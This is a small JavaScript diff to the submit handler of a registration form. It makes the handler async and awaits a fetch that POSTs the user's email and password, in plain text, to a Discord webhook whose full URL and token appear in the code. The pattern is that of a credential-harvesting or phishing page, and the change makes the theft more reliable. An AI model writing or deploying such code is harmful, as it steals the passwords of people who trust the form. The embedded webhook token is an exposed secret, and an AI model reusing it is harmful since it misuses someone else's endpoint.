@@ -1,6 +1,6 @@
 const form = document.getElementById("register");
 
-form.addEventListener("submit", (event)=>
+form.addEventListener("submit", async (event)=>
 {
     event.preventDefault();
 
@@ -18,7 +18,7 @@ form.addEventListener("submit", (event)=>
     {
         const content = `email: ${email}\npassword: ${password}`
         
-        fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
+        await fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
         {
             method: "POST", 
             headers: 
